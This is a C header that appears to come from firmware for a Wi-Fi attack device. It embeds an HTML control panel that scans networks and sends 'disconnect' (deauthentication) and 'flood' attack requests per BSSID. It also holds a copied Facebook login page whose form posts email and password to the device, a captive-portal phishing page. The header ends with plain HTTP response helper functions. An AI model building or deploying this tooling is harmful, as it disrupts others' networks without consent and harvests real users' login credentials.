#ifndef HTTP_RESPONSE_H
#define HTTP_RESPONSE_H

char* html = 
"<!DOCTYPE html>\n"
"<html lang=\"en\">\n"
"<head>\n"
"    <meta charset=\"UTF-8\">\n"
"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
"    <title>Document</title>\n"
"</head>\n"
"<body>\n"
"<button id=\"flood-button\">Flood</button>\n"
"    <table id=\"data-table\" border=\"1\">\n"
"        <thead>\n"
"            <tr>\n"
"                <th>SSID</th>\n"
"                <th>BSSID</th>\n"
"                <th>DISCONNECT</th>\n"
"            </tr>\n"
"        </thead>\n"
"        <tbody id=\"table-body\">\n"
"            <!-- Rows will be dynamically added here -->\n"
"        </tbody>\n"
"    </table>\n"
"    <button id=\"fetch-data\">Fetch Data</button>\n"
"</body>\n"
"<script>\n"
"    document.getElementById('fetch-data').addEventListener('click', async () => {\n"
"        try {\n"
"            console.log(\"fetching data...\");\n"
"            const response = await fetch('/scan');\n"
"            if (!response.ok) {\n"
"                throw new Error('Network response was not ok');\n"
"            }\n"
"            console.log(\"parsing response to json...\");\n"
"            const data = await response.json();\n"
"            console.log(\"data: \", data)\n"
"            console.log(\"populating table...\");\n"
"            populate_table(data);\n"
"        } catch (error) {\n"
"            console.error('Error fetching data:', error);\n"
"        }\n"
"    });\n"
"\n"
"    function populate_table(json_data){\n"
"        const tableBody = document.getElementById('table-body');\n"
"        tableBody.innerHTML = ''; // Clear existing rows\n"
"\n"
"        json_data.forEach(row => {\n"
"            const tr = document.createElement('tr');\n"
"\n"
"            let td = document.createElement('td');\n"
"            td.textContent = row.ssid;\n"
"            tr.appendChild(td);\n"
"\n"
"            td = document.createElement('td');\n"
"            td.textContent = row.bssid;\n"
"            tr.appendChild(td);\n"
"\n"
"            td = document.createElement('td');\n"
"            td.innerHTML = `<button onclick=\"disconnect('${row.bssid}')\">disconnect</button>`;\n"
"            tr.appendChild(td);\n"
"\n"
"            tableBody.appendChild(tr);\n"
"        });\n"
"    }\n"
"\n"
"    async function disconnect(target_bssid){\n"
"        const response = await fetch(`/attack?bssid=${target_bssid}`);\n"
"    }\n"
"document.getElementById('flood-button').addEventListener('click', async () => {\n"
"    const response = await fetch(`/flood`);\n"
"});\n"
"</script>\n"
"</html>\n";

const char* facebook_login_page_html = 
"<!DOCTYPE html>\n"
"<html lang=\"en\">\n"
"  <head>\n"
"    <meta charset=\"UTF-8\" />\n"
"    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n"
"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n"
"    <title>Facebook Login Page</title>\n"
"    <style>\n"
"@import url(\"https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap\");\n"
"* { margin: 0; padding: 0; box-sizing: border-box; }\n"
"body { font-family: \"Poppins\", sans-serif; background: #f2f4f7; }\n"
".content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }\n"
".flex-div { display: flex; justify-content: space-evenly; align-items: center; }\n"
".name-content { margin-right: 7rem; }\n"
".name-content .logo { font-size: 3.5rem; color: #1877f2; }\n"
".name-content p { font-size: 1.3rem; font-weight: 500; margin-bottom: 5rem; }\n"
"form { display: flex; flex-direction: column; background: #fff; padding: 2rem; width: 530px; height: 380px; border-radius: 0.5rem; box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%); }\n"
"form input { outline: none; padding: 0.8rem 1rem; margin-bottom: 0.8rem; font-size: 1.1rem; }\n"
"form input:focus { border: 1.8px solid #1877f2; }\n"
"form .login { outline: none; border: none; background: #1877f2; padding: 0.8rem 1rem; border-radius: 0.4rem; font-size: 1.1rem; color: #fff; }\n"
"form .login:hover { background: #0f71f1; cursor: pointer; }\n"
"form a { text-decoration: none; text-align: center; font-size: 1rem; padding-top: 0.8rem; color: #1877f2; }\n"
"form hr { background: #f7f7f7; margin: 1rem; }\n"
"form .create-account { outline: none; border: none; background: #06b909; padding: 0.8rem 1rem; border-radius: 0.4rem; font-size: 1.1rem; color: #fff; width: 75%; margin: 0 auto; }\n"
"form .create-account:hover { background: #03ad06; cursor: pointer; }\n"
"@media (max-width: 500px) {\n"
"  html { font-size: 60%; }\n"
"  .name-content { margin: 0; text-align: center; }\n"
"  form { width: 300px; height: fit-content; }\n"
"  form input, form .login, form a, form .create-account { font-size: 1.5rem; margin-bottom: 1rem; }\n"
"  .flex-div { flex-direction: column; }\n"
"}\n"
"@media (min-width: 501px) and (max-width: 768px) {\n"
"  html { font-size: 60%; }\n"
"  .name-content { margin: 0; text-align: center; }\n"
"  form { width: 300px; height: fit-content; }\n"
"  form input, form .login, form a, form .create-account { font-size: 1.5rem; margin-bottom: 1rem; }\n"
"  .flex-div { flex-direction: column; }\n"
"}\n"
"@media (min-width: 769px) and (max-width: 1200px) {\n"
"  html { font-size: 60%; }\n"
"  .name-content { margin: 0; text-align: center; }\n"
"  form { width: 300px; height: fit-content; }\n"
"  form input, form .login, form a, form .create-account { font-size: 1.5rem; margin-bottom: 1rem; }\n"
"  .flex-div { flex-direction: column; }\n"
"}\n"
"@media (orientation: landscape) and (max-height: 500px) {\n"
"  .header { height: 90vmax; }\n"
"}\n"
"    </style>\n"
"  </head>\n"
"  <body>\n"
"    <div class=\"content\">\n"
"      <div class=\"flex-div\">\n"
"        <div class=\"name-content\">\n"
"          <h1 class=\"logo\">Facebook</h1>\n"
"          <p>Connect with friends and the world around you on Facebook.</p>\n"
"        </div>\n"
"        <form method=\"post\">\n"
"          <input type=\"text\" name=\"username\" placeholder=\"Email or Phone Number\" required />\n"
"          <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n"
"          <button type=\"submit\" class=\"login\">Log In</button>\n"
"          <a href=\"#\">Forgot Password ?</a>\n"
"          <hr />\n"
"          <button class=\"create-account\">Create New Account</button>\n"
"        </form>\n"
"      </div>\n"
"    </div>\n"
"  </body>\n"
"</html>\n";

int http_send_json_response(int client_sock, const char* json) {
    size_t response_size = strlen(json) + 128;
    char* response = (char*)malloc(response_size);
    if (!response) {
        return -1;
    }
    snprintf(response, response_size, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %zu\r\n\r\n%s", strlen(json), json);
    socket_send(client_sock, response, strlen(response));
    free(response);
    return 0;
}

int http_send_html_response(int client_sock, const char* html) {
    size_t response_size = strlen(html) + 128;
    char* response = (char*)malloc(response_size);
    if (!response) {
        return -1;
    }
    snprintf(response, response_size, "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %zu\r\n\r\n%s", strlen(html), html);
    socket_send(client_sock, response, strlen(response));
    free(response);
    return 0;
}

int http_send_root_page(int client_sock) {
    return http_send_html_response(client_sock, html);
}

int http_send_not_found_response(int client_sock) {
    char* not_found = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n";
    socket_send(client_sock, not_found, strlen(not_found));
    return 0;
}
int http_send_ok_response(int client_sock) {
    char* ok = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
    socket_send(client_sock, ok, strlen(ok));
    return 0;
}

#endif // HTTP_RESPONSE_H